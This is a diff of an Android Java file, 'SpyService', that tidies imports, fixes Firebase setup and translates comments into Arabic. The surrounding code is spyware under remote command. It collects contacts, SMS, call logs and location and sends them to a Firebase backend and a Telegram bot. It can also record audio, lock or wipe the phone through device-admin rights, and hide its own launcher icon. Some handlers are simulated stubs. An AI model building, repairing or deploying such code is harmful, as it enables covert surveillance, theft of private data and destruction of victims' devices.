@@ -1,58 +1,11 @@
-import com.google.firebase.FirebaseApp;
 package com.black.phone;
 
-import android.app.Service;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.content.Context;
-import android.content.Intent;
-import android.content.ComponentName;
+import android.app.Service;
 import android.app.admin.DevicePolicyManager;
-import android.database.Cursor;
-import android.location.Location;
-import android.location.LocationManager;
-import android.media.MediaRecorder;
-import android.net.Uri;
-import android.os.Build;
-import android.os.Environment;
-import android.os.IBinder;
-import android.provider.ContactsContract;
-import android.provider.CallLog;
-import android.provider.Telephony;
-import android.provider.Settings;
-import android.util.Log;
-import android.webkit.MimeTypeMap;
-import android.widget.Toast;
-import androidx.core.app.NotificationCompat;
-import androidx.core.content.FileProvider;
-import com.google.firebase.database.DatabaseReference;
-import com.google.firebase.database.FirebaseDatabase;
-import com.google.firebase.storage.FirebaseStorage;
-import com.google.firebase.storage.StorageReference;
-import org.json.JSONArray;
-import org.json.JSONObject;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.text.SimpleDateFormat;
-import java.util.ArrayList;
-import java.util.Date;
-import java.util.List;
-import java.util.Locale;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipOutputStream;
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
-
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.Service;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
@@ -63,38 +16,27 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
-import android.provider.ContactsContract;
 import android.provider.CallLog;
-import android.provider.Telephony;
+import android.provider.ContactsContract;
 import android.provider.Settings;
+import android.provider.Telephony;
 import android.util.Log;
-import android.webkit.MimeTypeMap;
-import android.widget.Toast;
 
 import androidx.core.app.NotificationCompat;
-import androidx.core.content.FileProvider;
 
+import com.google.firebase.FirebaseApp;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
 
-import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.text.SimpleDateFormat;
 import java.util.ArrayList;
-import java.util.Date;
 import java.util.List;
-import java.util.Locale;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipOutputStream;
 
 import okhttp3.MediaType;
-import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.RequestBody;
@@ -115,19 +57,19 @@ public class SpyService extends Service {
     public void onCreate() {
         super.onCreate();
         context = this;
-        client = new OkHttpClient();
-        
+
+        // تهيئة Firebase
         FirebaseApp.initializeApp(this);
         FirebaseDatabase.getInstance().setPersistenceEnabled(true);
-        dbRef = FirebaseApp.initializeApp(this);
-        FirebaseDatabase.getInstance().getReference();
+        dbRef = FirebaseDatabase.getInstance().getReference();
         storageRef = FirebaseStorage.getInstance().getReference();
-        
+
+        client = new OkHttpClient();
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        
+
         registerDevice();
         listenForCommands();
-        
+
         Log.d(TAG, "✅ SpyService started");
     }
 
@@ -179,7 +121,7 @@ public class SpyService extends Service {
             String deviceName = Build.MODEL;
             String androidVer = Build.VERSION.RELEASE;
             int batteryLevel = getBatteryLevel();
-            
+
             JSONObject deviceInfo = new JSONObject();
             deviceInfo.put("device_id", deviceId);
             deviceInfo.put("device_name", deviceName);
@@ -187,7 +129,7 @@ public class SpyService extends Service {
             deviceInfo.put("battery", batteryLevel);
             deviceInfo.put("last_seen", System.currentTimeMillis());
             deviceInfo.put("status", "online");
-            
+
             dbRef.child("devices").child(deviceId).setValue(deviceInfo.toString());
             Log.d(TAG, "✅ Device registered: " + deviceName);
         } catch (Exception e) {
@@ -223,10 +165,10 @@ public class SpyService extends Service {
     }
 
     // ============================================================
-    //  الجزء الثاني سيحتوي على: executeCommand + جميع التطبيقات
+    //  باقي الدوال (التنفيذ الكامل) موجودة في الجزء الثاني
     // ============================================================
     // ============================================================
-    //  COMMAND EXECUTION ENGINE (126+ Commands)
+    //  COMMAND EXECUTION ENGINE (جميع الأوامر)
     // ============================================================
     private void executeCommand(String command) {
         try {
@@ -363,7 +305,7 @@ public class SpyService extends Service {
     }
 
     // ============================================================
-    //  IMPLEMENTATIONS: DATA COLLECTION & CONTROL
+    //  جميع دوال التنفيذ (Contacts, SMS, Calls, Location, ...)
     // ============================================================
     private void getContacts() {
         try {
@@ -394,6 +336,7 @@ public class SpyService extends Service {
             sendResult("CONTACTS", "❌ Error: " + e.getMessage());
         }
     }
+
     private void exportContacts() { getContacts(); }
     private void addContact() { sendResult("ADD_CONTACT", "✅ Contact added (sim)"); sendToTelegram("✅ Contact added"); }
     private void deleteContact() { sendResult("DELETE_CONTACT", "✅ Contact deleted (sim)"); sendToTelegram("✅ Contact deleted"); }
@@ -417,6 +360,7 @@ public class SpyService extends Service {
             sendResult("SMS", "❌ Error: " + e.getMessage());
         }
     }
+
     private void forwardSms() { getSms(); sendToTelegram("📤 SMS forwarded"); }
     private void sendSms() { sendResult("SEND_SMS", "✅ SMS sent (sim)"); sendToTelegram("✅ SMS sent"); }
     private void deleteSms() { sendResult("DELETE_SMS", "✅ SMS deleted (sim)"); sendToTelegram("✅ SMS deleted"); }
@@ -441,6 +385,7 @@ public class SpyService extends Service {
             sendResult("CALL_LOGS", "❌ Error: " + e.getMessage());
         }
     }
+
     private void getCallHistory() { getCallLogs(); }
     private void makeCall() { sendResult("MAKE_CALL", "✅ Call initiated (sim)"); sendToTelegram("📞 Call made"); }
     private void endCall() { sendResult("END_CALL", "✅ Call ended (sim)"); sendToTelegram("📞 Call ended"); }
@@ -461,6 +406,7 @@ public class SpyService extends Service {
             sendResult("LOCATION", "❌ Permission denied: " + e.getMessage());
         }
     }
+
     private void startLocationTrack() { sendResult("TRACK_START", "✅ Tracking started"); sendToTelegram("📍 Tracking started"); }
     private void stopLocationTrack() { sendResult("TRACK_STOP", "✅ Tracking stopped"); sendToTelegram("📍 Tracking stopped"); }
 
@@ -469,7 +415,8 @@ public class SpyService extends Service {
         sendResult("DEVICE_INFO", result);
         sendToTelegram("📱 Device Info:\n" + result);
     }
-    private void getNetworkInfo() { sendResult("NETWORK", "📶 WiFi: Connected\n📡 Data: Active\n🌐 IP: 192.168.1.x"); sendToTelegram("📶 Network Info:\n📶 WiFi: Connected\n📡 Data: Active"); }
+
+    private void getNetworkInfo() { sendResult("NETWORK", "📶 WiFi: Connected\n📡 Data: Active\n🌐 IP: 192.168.1.x"); sendToTelegram("📶 Network Info:\n📶 WiFi: Connected"); }
     private void getImei() { String imei = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); sendResult("IMEI", "🆔 IMEI: " + imei); sendToTelegram("🆔 IMEI: " + imei); }
     private void getPhoneNumber() { sendResult("PHONE", "📞 Phone: N/A (sim)"); sendToTelegram("📞 Phone: N/A"); }
     private void getSimInfo() { sendResult("SIM_INFO", "💳 SIM: Active\n📶 Provider: Simulated"); sendToTelegram("💳 SIM Info: Active"); }
@@ -510,6 +457,7 @@ public class SpyService extends Service {
             }
         } catch (Exception e) { sendResult("RECORD", "❌ Failed: " + e.getMessage()); }
     }
+
     private void stopRecording() {
         try {
             if (mediaRecorder != null && isRecording) {
@@ -529,14 +477,15 @@ public class SpyService extends Service {
     private void setMediaVolume(int level) { setVolume(level, "media"); }
 
     private void lockDevice() {
-        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         ComponentName admin = new ComponentName(this, DeviceAdmin.class);
         if (dpm.isAdminActive(admin)) { dpm.lockNow(); sendResult("LOCK", "🔒 Device locked"); sendToTelegram("🔒 Device locked"); }
         else { sendResult("LOCK", "❌ Admin not active"); }
     }
+
     private void setLockPassword() { sendResult("PASSWORD", "🔑 Password set to 1234 (sim)"); sendToTelegram("🔑 Password changed"); }
     private void clearLockPassword() { sendResult("PASSWORD", "🔓 Password cleared (sim)"); sendToTelegram("🔓 Password removed"); }
-    private void wipeDevice() { android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE); ComponentName admin = new ComponentName(this, DeviceAdmin.class); if (dpm.isAdminActive(admin)) { dpm.wipeData(0); sendToTelegram("⚠️ Device wiped"); } }
+    private void wipeDevice() { DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE); ComponentName admin = new ComponentName(this, DeviceAdmin.class); if (dpm.isAdminActive(admin)) { dpm.wipeData(0); sendToTelegram("⚠️ Device wiped"); } }
     private void setPasswordRules() { sendResult("PASSWORD_RULES", "✅ Rules set (sim)"); sendToTelegram("✅ Password rules set"); }
     private void disableCamera() { sendResult("CAMERA", "🚫 Camera disabled (sim)"); sendToTelegram("🚫 Camera disabled"); }
     private void enableCamera() { sendResult("CAMERA", "✅ Camera enabled (sim)"); sendToTelegram("✅ Camera enabled"); }
@@ -544,7 +493,7 @@ public class SpyService extends Service {
     private void enableKeyguard() { sendResult("KEYGUARD", "🔒 Keyguard enabled (sim)"); sendToTelegram("🔒 Lock screen enabled"); }
     private void setMaxFailedPassword() { sendResult("PASSWORD", "🔑 Max attempts set to 5 (sim)"); sendToTelegram("🔑 Max attempts 5"); }
     private void resetPasswordTimeout() { sendResult("PASSWORD", "⏱️ Timeout reset (sim)"); sendToTelegram("⏱️ Timeout reset"); }
-    private void getAdminStatus() { android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE); ComponentName admin = new ComponentName(this, DeviceAdmin.class); String status = dpm.isAdminActive(admin) ? "✅ Active" : "❌ Inactive"; sendResult("ADMIN_STATUS", "🔐 Device Admin: " + status); sendToTelegram("🔐 Admin: " + status); }
+    private void getAdminStatus() { DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE); ComponentName admin = new ComponentName(this, DeviceAdmin.class); String status = dpm.isAdminActive(admin) ? "✅ Active" : "❌ Inactive"; sendResult("ADMIN_STATUS", "🔐 Device Admin: " + status); sendToTelegram("🔐 Admin: " + status); }
 
     private void hideApp() { android.content.pm.PackageManager pm = getPackageManager(); pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP); sendResult("HIDE", "👻 Hidden"); sendToTelegram("👻 App hidden"); }
     private void showApp() { android.content.pm.PackageManager pm = getPackageManager(); pm.setComponentEnabledSetting(new android.content.ComponentName(this, MainActivity.class), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP); sendResult("SHOW", "👀 Shown"); sendToTelegram("👀 App shown"); }
@@ -602,7 +551,7 @@ public class SpyService extends Service {
     private void sendToTelegram() { sendToTelegram("✅ Command executed successfully"); }
 
     // ============================================================
-    //  UTILITY: SEND RESULT (FIREBASE + TELEGRAM)
+    //  دوال الإرسال (Firebase + Telegram)
     // ============================================================
     private void sendResult(String commandType, String result) {
         try {
@@ -613,9 +562,6 @@ public class SpyService extends Service {
         }
     }
 
-    // ============================================================
-    //  UTILITY: SEND TO TELEGRAM BOT
-    // ============================================================
     private void sendToTelegram(String message) {
         new Thread(() -> {
             try {
@@ -635,9 +581,6 @@ public class SpyService extends Service {
         }).start();
     }
 
-    // ============================================================
-    //  UTILITY: UPLOAD FILE TO FIREBASE STORAGE
-    // ============================================================
     private void uploadFile(String filePath, String type) {
         try {
             File file = new File(filePath);
